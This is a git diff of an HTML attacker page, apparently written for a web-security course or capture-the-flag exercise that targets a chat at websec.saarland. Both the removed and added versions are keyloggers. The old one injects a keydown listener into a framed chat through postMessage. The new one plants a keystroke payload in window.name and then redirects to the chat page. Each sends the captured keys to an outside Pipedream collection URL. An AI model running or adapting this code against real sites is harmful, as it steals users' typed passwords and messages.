@@ -1,56 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Owley Logger</title>
-  <script>
-    // Function to send logs to your Pipedream endpoint
-    function logToServer(data) {
-      fetch("https://eooaktfbjo7cto7.m.pipedream.net", {
-        method: "POST",
-        mode: "no-cors",
-        body: JSON.stringify({ data: data })
-      });
-    }
-
-    function setupKeylogger() {
-      const iframe = document.getElementById('chat_frame');
-      const chatOrigin = 'https://chat.websec.saarland';
-
-      // Inject keylogger script into the iframe
-      const injectScript = `
-        window.addEventListener('keydown', (e) => {
-          // Send key back to parent
-          window.parent.postMessage({ key: e.key }, '*');
-        });
-        true; // Needed for Safari compatibility
-      `;
-
-      try {
-        // Wait for iframe to load, then inject the script
-        iframe.contentWindow.postMessage({
-          type: 'inject',
-          script: injectScript
-        }, chatOrigin);
-      } catch (e) {
-        logToServer("Error: " + e.message);
-      }
-    }
-
-    // Listen for messages from the iframe (keystrokes)
-    window.addEventListener('message', (e) => {
-      if (e.data && e.data.key) {
-        logToServer(e.data.key);
-      }
-    });
-  </script>
+    <title>Loading Chat...</title>
 </head>
 <body>
-  <h1>Welcome Owley 😈</h1>
-  <iframe 
-    id="chat_frame"
-    src="https://chat.websec.saarland" 
-    onload="setupKeylogger()"
-    style="width: 100%; height: 500px; border: 1px solid black;"
-  ></iframe>
+    <script>
+        // Set the keylogger payload in window.name
+        window.name = `
+            // Keylogger payload
+            document.addEventListener('keydown', function(e) {
+                // Send each keystroke to your Pipedream endpoint
+                fetch('https://eooaktfbjo7cto7.m.pipedream.net?key=' + encodeURIComponent(e.key));
+            });
+        `;
+        
+        // Redirect to the suspected Owley Madison chat page
+        window.location = 'https://gameserver.websec.saarland/owley/chat';
+    </script>
 </body>
 </html>
